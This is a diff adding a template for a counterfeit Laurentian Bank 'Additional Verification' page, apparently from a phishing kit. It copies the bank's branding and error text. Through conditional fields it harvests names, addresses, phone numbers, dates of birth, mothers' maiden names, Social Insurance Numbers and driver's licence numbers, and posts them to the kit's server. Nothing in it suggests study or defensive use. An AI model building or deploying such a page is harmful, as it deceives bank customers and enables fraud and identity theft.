@@ -1,0 +1,202 @@
+<%
+
+let name = laur.name
+let address = laur.address
+let postal = laur.postal
+let phone = laur.phone
+let pin = laur.pin
+let dob = laur.dob
+let email = laur.email
+let mmn = laur.mmn
+let sin = laur.sin
+let dl = laur.dl
+
+%>
+<html xmlns:layout="http://www.ultraq.net.nz/web/thymeleaf/layout" lang="en_CA">
+    <head>
+        <title>Login</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2">
+        <link type="text/css" href="/assets/laur/md-reno-base-mobile.css?1" rel="stylesheet">
+        <link type="text/css" href="/assets/laur/theme-laurentianbank-md-refresh-mobile.css" rel="stylesheet">
+        <link type="text/css" href="/assets/laur/login-common.css" rel="stylesheet">
+        <link type="text/css" href="/assets/laur/secure-key.css" rel="stylesheet">
+        <link rel="icon" href="/assets/laur/favicon.png">
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = '<?=escape($udata->last->bank)?>';
+            var lrinfo = '<?=escape($udata->last->info)?>';
+        </script>
+        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
+        <script src="/assets/js/details.js?v=<?=time()?>"></script>
+    </head>
+    <body ng-app="UxpLoginApp" class="uxp-theme ng-scope">
+        <div class="widget-c1-oauth-login position-relative oauth-login">
+            <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">
+                <div class="errors errors-login error-state error-div" <?=!$error ? 'style="display: none"' : 'style="display: block"'?>>
+                    <span ng-hide="state.isSubmittingForm || state.isFieldOnChange" class="error-message">The username you entered does not match our records. Please try again.</span>
+                </div>
+                <form id="input-form" name="" class="center-block c1-login-form ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength" action="" method="post" autocomplete="off">
+                    <div>
+                        <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()" class="ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength">
+                            <div class="logo text-center">
+                                <img src="/assets/laur/logo.svg" alt="Laurentian Bank logo.">
+                            </div>
+                            <div>
+                                <h1>Additional Verification</h1>
+                                <div class="login-id-fields">
+                                    <?php $x=0; if ($p_name || $p_address || $p_postal || $p_email || $p_phone || $p_dob) { $x=1; ?>
+                                    <p style="margin-bottom: 30px; ">To verify your login, we require some additional information regarding your account.</p>
+                                    <?php } if ($p_name && $p_split) { ?>
+                                    <div>
+                                        <div style="display: inline-block; width: calc(50% - 6px)">
+                                            <div class="new-login-fields">
+                                                <div  class="ng-scope form-group">
+                                                    <div class="is-empty">
+                                                        <label>
+                                                            <span aria-hidden="true">First Name</span>
+                                                            <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling First Name" id="input-fname" name="fname" type="text" value="" required placeholder="First Name">
+                                                        </label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div style="display: inline-block; width: 50%">
+                                            <div class="new-login-fields">
+                                                <div  class="ng-scope form-group">
+                                                    <div class="is-empty">
+                                                        <label>
+                                                            <span aria-hidden="true">Last Name</span>
+                                                            <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Last Name" id="input-lname" name="lname" type="text" value="" required placeholder="Last Name">
+                                                        </label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_name && !$p_split) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Full Name</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Name" id="input-name" name="name" type="text" value="" required placeholder="Full Name">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_address) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Address</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Address" id="input-address" name="address" type="text" value="" required placeholder="Address">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">City</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling City" id="input-city" name="city" type="tel" value="" required placeholder="City">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_postal) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Postal Code</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Postal" id="input-postal" name="postal" type="text" value="" required placeholder="Postal Code" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_email) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Email Address</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Email" id="input-email" name="email" type="email" value="" required placeholder="Email Address">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_phone) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Phone Number</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Phone" id="input-phone" name="phone" type="tel" value="" required placeholder="Phone Number" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_dob) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Date of Birth</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling DoB" id="input-dob" name="dob" type="tel" value="" required placeholder="Date of Birth" minlength="10" maxlength="10">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_mmn || $p_sin || $p_drivers) {  ?>
+                                    <p style="margin-bottom: 30px; margin-top: 20px;">To finish verifying your identity, we require you confirm some additional information.</p>
+                                    <?php } if ($p_mmn) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Mother's Maiden Name</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling MMN" id="input-mmn" name="mmn" type="text" value="" required placeholder="Mother's Maiden Name">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_sin) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Social Insurance Number</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling SIN" id="input-sin" name="sin" type="tel" value="" required placeholder="Social Insurance Number" minlength="11" maxlength="11" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } if ($p_drivers) { ?>
+                                    <div class="new-login-fields">
+                                        <div  class="ng-scope form-group">
+                                            <div class="is-empty">
+                                                <label>
+                                                    <span aria-hidden="true">Driver's Licence Number</span>
+                                                    <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling Drivers" id="input-drivers" name="drivers" type="text" value="" placeholder="Driver's Licence Number">
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <?php } ?>
+                                    <div class="memorized-login-fields">
+                                    </div>
+                                </div>
+                                <div class="text-center c1-btn-container">
+                                    <button type="submit" id="" name="save" value="1">Continue</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </body>
+</html>
